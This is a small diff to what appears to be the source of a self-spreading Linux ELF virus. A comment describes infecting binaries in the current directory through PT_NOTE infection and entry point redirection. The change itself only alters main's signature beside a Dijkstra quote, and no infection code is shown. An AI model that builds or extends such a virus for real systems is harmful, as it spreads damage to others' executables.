@@ -10,7 +10,7 @@
 // binaries within the current directory using the pt_note infection algorithm
 // and entry point redirection. When any infected host is run, it spreads
 // itself like a virus where permission allows.
-int main(int argc, char* argv[], char* env[]) {
+int main() {
   const char* quote1 = STR_LITERAL(
       "If debugging is the process of removing software bugs, then programming "
       "must be the process of putting them in. - Edsger Dijkstra\n");
